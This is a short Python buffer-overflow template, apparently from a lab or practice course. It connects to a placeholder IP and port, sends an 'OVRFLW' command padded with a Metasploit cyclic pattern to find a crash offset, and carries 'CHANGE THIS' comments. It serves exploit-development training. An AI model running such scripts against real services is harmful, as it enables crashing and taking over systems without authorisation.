import socket, time, sys

ip = "XXX.XXX.XX.X"  #CHANGE THIS
port = XXXX        #CHANGE THIS
timeout = 5

#CHANGE THE PATTERN
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

pattern = ""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
s.recv(1024)
print("Sending pattern of %s bytes" % len(pattern))
s.send("OVRFLW " + pattern)  #Change this 
s.recv(1024)
s.close()
